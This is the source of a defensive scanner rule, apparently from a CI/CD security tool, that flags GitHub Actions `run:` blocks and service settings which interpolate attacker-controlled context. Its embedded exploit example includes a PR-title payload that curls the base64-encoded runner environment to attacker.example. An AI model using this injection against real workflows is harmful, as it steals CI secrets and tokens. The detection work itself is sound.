"""GHA-003, `run:` blocks must not interpolate attacker-controllable context."""
from __future__ import annotations

from typing import Any

from ..._primitives.tainted_variables import (
    has_direct_taint,
    has_unsafe_reference,
)
from ..._yaml_lines import line_of as _line_of
from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location
from ._helpers import UNTRUSTED_CONTEXT_RE

RULE = Rule(
    id="GHA-003",
    title="Script injection via untrusted context",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Pass untrusted values through an intermediate `env:` variable "
        "and reference that variable from the shell script. GitHub's "
        "expression evaluation happens before shell quoting, so inline "
        "`${{ github.event.* }}` is always unsafe."
    ),
    docs_note=(
        "Interpolating attacker-controlled context fields (PR "
        "title/body, issue body, comment body, commit message, "
        "discussion body, head branch name, `github.ref_name`, "
        "`inputs.*`, release metadata, deployment payloads) directly "
        "into a `run:` block is shell injection. GitHub expands "
        "`${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, "
        "or `;` in the source field executes."
    ),
    incident_refs=(
        "[GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) "
        "(2020): a sweep of public Actions found dozens of widely-"
        "used workflows interpolating ``github.event.issue.title`` "
        "/ ``pull_request.title`` directly into shell. Any "
        "commenter or PR author could run arbitrary commands in "
        "the maintainer's CI.",
        "[Keeping your GitHub Actions and workflows secure: "
        "Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) "
        "(GitHub Security Lab, 2020): the same primitive against "
        "``pull_request_target`` workflows where the runner has "
        "secrets and a write-scope token; one fork PR exfiltrates "
        "every secret the workflow can see. Mitigation: never "
        "interpolate context into shell, route through ``env:``.",
    ),
    exploit_example=(
        "# Vulnerable: PR title interpolated straight into shell.\n"
        "name: triage\n"
        "on:\n"
        "  pull_request_target:\n"
        "    types: [opened, edited]\n"
        "jobs:\n"
        "  greet:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "          echo \"New PR: ${{ github.event.pull_request.title }}\"\n"
        "\n"
        "# Attack: open a PR with the title:\n"
        "#\n"
        "#   foo\"; curl -X POST https://attacker.example/exfil \\\n"
        "#         -d \"$(env | base64 -w0)\"; echo \"\n"
        "#\n"
        "# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the\n"
        "# title's `\"` closes the echo string and the rest of the line\n"
        "# becomes shell. The pull_request_target trigger means the\n"
        "# runner already has secrets and a write-scope GITHUB_TOKEN,\n"
        "# so the curl exfils every secret the workflow can see.\n"
        "\n"
        "# Safe: route through env so the value is never interpolated\n"
        "# into the shell template:\n"
        "      - env:\n"
        "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
        "        run: |\n"
        "          echo \"New PR: $PR_TITLE\""
    ),
)


def _tainted_env_vars(env_block: Any) -> set[str]:
    """Return env var names whose values reference untrusted context."""
    if not isinstance(env_block, dict):
        return set()
    return {
        str(name)
        for name, value in env_block.items()
        if isinstance(value, str) and UNTRUSTED_CONTEXT_RE.search(value)
    }


def _gha_ref_pattern(name: str) -> str:
    """Match every GHA reference syntax for *name*: ``$VAR``, ``${VAR}``,
    or ``${{ env.VAR }}``."""
    return rf"(?:\$\{{{name}\}}|\${name}\b|\${{{{[\s]*env\.{name}[\s]*}}}})"


def _service_sink_taints(
    job_id: str, job: dict[str, Any],
) -> list[str]:
    """Return offender labels for ``services.<name>.options`` and
    ``services.<name>.env.<key>`` values that directly interpolate an
    untrusted context expression.

    GitHub passes ``services.<name>.options`` straight to the
    runner's ``docker create`` argv, and ``services.<name>.env``
    entries become container env vars at create time. Both surfaces
    are docker-shell sinks for untrusted ``${{ ... }}`` expansions
    (mirrors zizmor proposal #1128). Indirect taint via workflow
    env vars doesn't apply, the runner doesn't expand ``$NAME`` in
    these positions.
    """
    services = job.get("services")
    if not isinstance(services, dict):
        return []
    out: list[str] = []
    for svc_name, svc in services.items():
        if not isinstance(svc, dict):
            continue
        options = svc.get("options")
        if (
            isinstance(options, str)
            and UNTRUSTED_CONTEXT_RE.search(options)
        ):
            out.append(f"{job_id}.services.{svc_name}.options")
        env_block = svc.get("env")
        if isinstance(env_block, dict):
            for env_key, env_val in env_block.items():
                if (
                    isinstance(env_val, str)
                    and UNTRUSTED_CONTEXT_RE.search(env_val)
                ):
                    out.append(
                        f"{job_id}.services.{svc_name}.env.{env_key}"
                    )
    return out


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    # Preserve insertion order without duplicates so reachability-aware
    # chains can see every job that contains an injection sink, not
    # just the first one. ``dict.fromkeys`` is the ordered-set idiom.
    anchor_jobs: dict[str, None] = {}
    # Workflow-level tainted env vars, inherited by all jobs.
    wf_tainted = _tainted_env_vars(doc.get("env"))
    for job_id, job in iter_jobs(doc):
        # Job-level env inherits workflow-level taint.
        job_tainted = wf_tainted | _tainted_env_vars(job.get("env"))
        # services.<name>.options and services.<name>.env.<key> are
        # docker-shell sinks. Same direct-taint shape as a ``run:``
        # block; no env-var indirection (the runner doesn't expand
        # ``$NAME`` in these positions).
        for service_label in _service_sink_taints(job_id, job):
            offenders.append(service_label)
            line = _line_of(job.get("services"))
            if line is not None:
                locations.append(Location(
                    path=path, start_line=line, end_line=line,
                ))
            anchor_jobs[job_id] = None
        for idx, step in enumerate(iter_steps(job)):
            run = step.get("run")
            if not isinstance(run, str):
                continue
            lines = run.splitlines()
            # Step-level env inherits job + workflow taint.
            step_tainted = job_tainted | _tainted_env_vars(step.get("env"))
            # 1. Direct interpolation of untrusted context expressions.
            if has_direct_taint(lines, UNTRUSTED_CONTEXT_RE) or step_tainted and has_unsafe_reference(
                lines, step_tainted, ref_pattern=_gha_ref_pattern
            ):
                offenders.append(f"{job_id}[{idx}]")
                locations.append(step_location(path, step))
                anchor_jobs[job_id] = None
    passed = not offenders
    desc = (
        "No `run:` block interpolates attacker-controllable context fields."
        if passed else
        f"`run:` blocks interpolate untrusted context (directly or via "
        f"env: inheritance) into shell commands in: "
        f"{', '.join(offenders)}. These fields can contain shell "
        f"metacharacters that execute as part of the build."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
        job_anchors=tuple(anchor_jobs),
    )
